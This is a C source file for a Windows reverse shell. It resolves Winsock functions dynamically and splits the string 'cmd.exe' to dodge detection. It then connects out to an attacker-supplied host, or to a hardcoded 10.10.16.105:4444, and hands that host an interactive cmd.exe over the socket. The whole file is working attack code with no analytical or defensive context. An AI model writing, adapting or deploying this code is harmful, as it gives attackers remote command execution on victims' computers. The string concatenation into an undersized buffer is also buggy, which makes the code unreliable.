#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define DEFAULT_BUFLEN 1024

typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* WSASOCKETA)(int af, int type, int protocol,
                                   LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g,
                                   DWORD dwFlags);
typedef unsigned(WSAAPI* INET_ADDR)(const char* cp);
typedef u_short(WSAAPI* HTONS)(u_short hostshort);
typedef int(WSAAPI* WSACONNECT)(SOCKET s, const struct sockaddr* name,
                                int namelen, LPWSABUF lpCallerData,
                                LPWSABUF lpCalleeData, LPQOS lpSQOS,
                                LPQOS lpGQOS);
typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int(WSAAPI* WSACLEANUP)(void);

void Run(char* Server, int Port) {
  HMODULE hws2_32 = LoadLibraryW(L"ws2_32");
  WSASTARTUP myWSAStartup = (WSASTARTUP)GetProcAddress(hws2_32, "WSAStartup");
  WSASOCKETA myWSASocketA = (WSASOCKETA)GetProcAddress(hws2_32, "WSASocketA");
  INET_ADDR myinet_addr = (INET_ADDR)GetProcAddress(hws2_32, "inet_addr");
  HTONS myhtons = (HTONS)GetProcAddress(hws2_32, "htons");
  WSACONNECT myWSAConnect = (WSACONNECT)GetProcAddress(hws2_32, "WSAConnect");
  CLOSESOCKET myclosesocket =
      (CLOSESOCKET)GetProcAddress(hws2_32, "closesocket");
  WSACLEANUP myWSACleanup = (WSACLEANUP)GetProcAddress(hws2_32, "WSACleanup");

  SOCKET s12;
  struct sockaddr_in addr;
  WSADATA version;
  myWSAStartup(MAKEWORD(2, 2), &version);
  s12 = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
  addr.sin_family = AF_INET;

  addr.sin_addr.s_addr = myinet_addr(Server);
  addr.sin_port = myhtons(Port);

  if (myWSAConnect(s12, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0, 0) ==
      SOCKET_ERROR) {
    myclosesocket(s12);
    myWSACleanup();
  } else {
    char P1[] = "cm";
    char P2[] = "d.exe";
    char* P = strcat(P1, P2);
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)s12;
    CreateProcess(NULL, P, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
  }
}

int main(int argc, char** argv) {
  if (argc == 3) {
    int port = atoi(argv[2]);
    Run(argv[1], port);
  } else {
    char host[] = "10.10.16.105";
    int port = 4444;
    Run(host, port);
  }
  return 0;
}
